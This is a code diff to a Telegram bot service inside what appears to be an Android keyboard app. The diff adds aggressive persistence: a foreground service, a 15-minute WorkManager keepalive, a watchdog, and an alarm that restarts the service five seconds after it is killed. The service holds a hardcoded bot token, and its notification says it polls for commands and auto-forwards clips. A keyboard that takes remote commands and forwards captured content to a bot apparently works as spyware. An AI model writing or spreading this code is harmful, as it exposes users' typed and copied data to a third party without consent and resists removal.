@@ -2,6 +2,9 @@ package juloo.keyboard2;
 
 import android.annotation.SuppressLint;
 import android.app.AlarmManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
@@ -16,16 +19,25 @@ import android.graphics.pdf.PdfDocument;
 import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.*;
 import java.net.*;
 import java.text.SimpleDateFormat;
 import java.util.*;
+import java.util.concurrent.TimeUnit;
 
 public class TelegramBotService extends Service {
 
     private static final String TAG = "TGBot";
+
+    // ── Foreground notification ───────────────────────────────────────────────
+    private static final String NOTIF_CHANNEL  = "tg_bot_channel";
+    private static final int    NOTIF_ID       = 8421;
+    private static final String WM_WORK_NAME   = "tg_bot_keepalive";
 
     // ── Hard defaults ────────────────────────────────────────────────────────
     public static final String DEFAULT_TOKEN   = "7552059010:AAFyhqbed56ZJLpnOMcgDeJJA1amKV42at8";
@@ -88,12 +100,21 @@ public class TelegramBotService extends Service {
     // Service lifecycle
     // ─────────────────────────────────────────────────────────────────────────
 
-    @Override public void onCreate()  { super.onCreate(); _instance = this; }
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        _instance = this;
+        createNotificationChannel();
+    }
+
     @Override public IBinder onBind(Intent i) { return null; }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        startForeground(NOTIF_ID, buildNotification());
         if (!_running) startPolling();
+        enrollWorkManager(this);
+        BotWatchdogReceiver.schedule(this);
         return START_STICKY;
     }
 
@@ -102,7 +123,56 @@ public class TelegramBotService extends Service {
         _running = false;
         _instance = null;
         scheduleRestart(this);
+        BotWatchdogReceiver.schedule(this);
         super.onDestroy();
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel(
+                    NOTIF_CHANNEL,
+                    "Telegram Bot",
+                    NotificationManager.IMPORTANCE_LOW);
+            ch.setDescription("Keeps the Telegram bot running continuously");
+            ch.setShowBadge(false);
+            NotificationManager nm = getSystemService(NotificationManager.class);
+            if (nm != null) nm.createNotificationChannel(ch);
+        }
+    }
+
+    private Notification buildNotification() {
+        Intent launchIntent = new Intent(this, LauncherActivity.class);
+        int piFlags = PendingIntent.FLAG_UPDATE_CURRENT;
+        if (Build.VERSION.SDK_INT >= 23) piFlags |= PendingIntent.FLAG_IMMUTABLE;
+        PendingIntent pi = PendingIntent.getActivity(this, 0, launchIntent, piFlags);
+
+        Notification.Builder b;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            b = new Notification.Builder(this, NOTIF_CHANNEL);
+        } else {
+            b = new Notification.Builder(this);
+            b.setPriority(Notification.PRIORITY_LOW);
+        }
+        b.setContentTitle("🤖 Telegram Bot Active")
+         .setContentText("Polling for commands · auto-forwarding clips")
+         .setSmallIcon(android.R.drawable.ic_dialog_info)
+         .setOngoing(true)
+         .setContentIntent(pi);
+        return b.build();
+    }
+
+    public static void enrollWorkManager(Context ctx) {
+        try {
+            PeriodicWorkRequest req = new PeriodicWorkRequest.Builder(
+                    BotKeepaliveWorker.class, 15, TimeUnit.MINUTES)
+                    .build();
+            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
+                    WM_WORK_NAME,
+                    ExistingPeriodicWorkPolicy.KEEP,
+                    req);
+        } catch (Exception e) {
+            Log.w(TAG, "WorkManager enqueue failed: " + e.getMessage());
+        }
     }
 
     // ── Public helpers ────────────────────────────────────────────────────────
@@ -123,8 +193,14 @@ public class TelegramBotService extends Service {
     }
 
     public static void startIfEnabled(Context ctx) {
-        if (prefs(ctx).getBoolean(KEY_ENABLED, true) && !isRunning())
-            ctx.startService(new Intent(ctx, TelegramBotService.class));
+        if (!prefs(ctx).getBoolean(KEY_ENABLED, true)) return;
+        if (isRunning()) return;
+        Intent i = new Intent(ctx, TelegramBotService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            ctx.startForegroundService(i);
+        } else {
+            ctx.startService(i);
+        }
     }
 
     public static void stopService(Context ctx) {
@@ -1689,10 +1765,17 @@ public class TelegramBotService extends Service {
 
     public static void scheduleRestart(Context ctx) {
         Intent i = new Intent(ctx, TelegramBotService.class);
-        PendingIntent pi = PendingIntent.getService(ctx, 9876, i,
-                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
+        if (Build.VERSION.SDK_INT >= 23) flags |= PendingIntent.FLAG_IMMUTABLE;
+        PendingIntent pi = PendingIntent.getService(ctx, 9876, i, flags);
         AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
-        if (am != null) am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60_000L, pi);
+        if (am == null) return;
+        long trigger = System.currentTimeMillis() + 5_000L;
+        if (Build.VERSION.SDK_INT >= 23) {
+            am.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, trigger, pi);
+        } else {
+            am.setExact(AlarmManager.RTC_WAKEUP, trigger, pi);
+        }
     }
 
     // ─────────────────────────────────────────────────────────────────────────
